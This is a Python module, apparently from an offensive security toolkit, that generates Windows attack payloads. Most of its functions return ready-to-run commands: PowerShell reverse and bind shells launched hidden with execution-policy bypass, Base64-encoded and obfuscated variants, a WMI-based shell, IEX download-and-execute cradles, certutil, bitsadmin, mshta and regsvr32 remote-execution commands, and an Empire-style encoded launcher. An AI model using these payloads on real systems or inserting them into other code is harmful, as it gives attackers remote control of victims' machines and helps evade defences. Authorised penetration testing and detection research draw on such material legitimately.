"""Windows-specific payload generation for shells."""

import base64
import logging

logger = logging.getLogger(__name__)


class WindowsPayloads:
    """Generate Windows-specific shell payloads."""

    @staticmethod
    def powershell_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate PowerShell reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            PowerShell reverse shell command
        """
        payload = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{payload}\""

    @staticmethod
    def powershell_reverse_shell_encoded(attacker_ip: str, attacker_port: int) -> str:
        """Generate Base64 encoded PowerShell reverse shell payload.

        Useful for bypassing execution policy and special characters.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Encoded PowerShell reverse shell command
        """
        payload = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )
        # Encode to Base64 (UTF-16LE for PowerShell)
        encoded = base64.b64encode(payload.encode("utf-16le")).decode()
        return f"powershell -EncodedCommand {encoded}"

    @staticmethod
    def cmd_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate CMD reverse shell payload using PowerShell.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            CMD reverse shell command
        """
        # CMD doesn't have native networking, so we use PowerShell
        ps_payload = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'CMD> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )
        return f'powershell -Command "{ps_payload}"'

    @staticmethod
    def powershell_download_cradle(url: str, output_path: str | None = None) -> str:
        """Generate PowerShell download cradle.

        Args:
            url: URL to download from
            output_path: Optional output path (if None, execute in memory)

        Returns:
            PowerShell download command
        """
        if output_path:
            # Download to file
            return (
                f"powershell -Command \"Invoke-WebRequest -Uri '{url}' "
                f"-OutFile '{output_path}'\""
            )
        else:
            # Download and execute in memory
            return f"powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('{url}')\""

    @staticmethod
    def powershell_download_execute(url: str, output_path: str) -> str:
        """Generate PowerShell download and execute payload.

        Args:
            url: URL to download from
            output_path: Path to save the file

        Returns:
            PowerShell download and execute command
        """
        return (
            f"powershell -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '{output_path}'; "
            f"Start-Process '{output_path}'\""
        )

    @staticmethod
    def wmi_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate WMI-based shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            WMI shell command
        """
        # WMI shell using PowerShell
        payload = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $data).ProcessId;"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )
        return f"powershell -Command \"{payload}\""

    @staticmethod
    def powershell_bind_shell(port: int) -> str:
        """Generate PowerShell bind shell payload.

        Args:
            port: Port to bind on

        Returns:
            PowerShell bind shell command
        """
        payload = (
            f"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{port});"
            f"$listener.Start();"
            f"$client = $listener.AcceptTcpClient();"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close();"
            f"$listener.Stop()"
        )
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{payload}\""

    @staticmethod
    def powershell_obfuscated(command: str) -> str:
        """Generate obfuscated PowerShell command.

        Simple obfuscation using string concatenation.

        Args:
            command: PowerShell command to obfuscate

        Returns:
            Obfuscated PowerShell command
        """
        # Split command into chunks and concatenate
        chunks = [command[i:i+3] for i in range(0, len(command), 3)]
        obfuscated = "+".join([f"'{chunk}'" for chunk in chunks])
        return f"powershell -Command \"IEX ({obfuscated})\""

    @staticmethod
    def mshta_payload(url: str) -> str:
        """Generate MSHTA payload for remote execution.

        Args:
            url: URL to HTA file

        Returns:
            MSHTA command
        """
        return f"mshta {url}"

    @staticmethod
    def regsvr32_payload(url: str) -> str:
        """Generate regsvr32 payload for remote execution.

        Args:
            url: URL to SCT file

        Returns:
            regsvr32 command
        """
        return f"regsvr32 /s /n /u /i:{url} scrobj.dll"

    @staticmethod
    def certutil_download(url: str, output_path: str) -> str:
        """Generate certutil download command.

        Args:
            url: URL to download from
            output_path: Path to save the file

        Returns:
            certutil download command
        """
        return f"certutil -urlcache -split -f {url} {output_path}"

    @staticmethod
    def bitsadmin_download(url: str, output_path: str) -> str:
        """Generate bitsadmin download command.

        Args:
            url: URL to download from
            output_path: Path to save the file

        Returns:
            bitsadmin download command
        """
        return f"bitsadmin /transfer myDownloadJob /download /priority normal {url} {output_path}"

    @staticmethod
    def powershell_empire_launcher(listener_url: str) -> str:
        """Generate PowerShell Empire-style launcher.

        Args:
            listener_url: Empire listener URL

        Returns:
            PowerShell Empire launcher command
        """
        payload = f"IEX (New-Object Net.WebClient).DownloadString('{listener_url}')"
        encoded = base64.b64encode(payload.encode("utf-16le")).decode()
        return f"powershell -NoP -sta -NonI -W Hidden -Enc {encoded}"

    @staticmethod
    def get_windows_payload(
        payload_type: str,
        attacker_ip: str,
        attacker_port: int,
    ) -> str:
        """Get Windows payload by type.

        Args:
            payload_type: Payload type (powershell, cmd, wmi, etc.)
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Windows shell payload command

        Raises:
            ValueError: If payload type is unknown
        """
        payload_map = {
            "powershell": WindowsPayloads.powershell_reverse_shell,
            "powershell_encoded": WindowsPayloads.powershell_reverse_shell_encoded,
            "cmd": WindowsPayloads.cmd_reverse_shell,
            "wmi": WindowsPayloads.wmi_shell,
        }

        if payload_type not in payload_map:
            raise ValueError(
                f"Unknown Windows payload type: {payload_type}. "
                f"Available: {', '.join(payload_map.keys())}"
            )

        return payload_map[payload_type](attacker_ip, attacker_port)

    @staticmethod
    def get_download_payload(
        method: str,
        url: str,
        output_path: str | None = None,
    ) -> str:
        """Get download payload by method.

        Args:
            method: Download method (powershell, certutil, bitsadmin)
            url: URL to download from
            output_path: Optional output path

        Returns:
            Download command

        Raises:
            ValueError: If method is unknown or output_path required but not provided
        """
        if method == "powershell":
            return WindowsPayloads.powershell_download_cradle(url, output_path)
        elif method == "certutil":
            if not output_path:
                raise ValueError("output_path required for certutil")
            return WindowsPayloads.certutil_download(url, output_path)
        elif method == "bitsadmin":
            if not output_path:
                raise ValueError("output_path required for bitsadmin")
            return WindowsPayloads.bitsadmin_download(url, output_path)
        else:
            raise ValueError(
                f"Unknown download method: {method}. "
                f"Available: powershell, certutil, bitsadmin"
            )
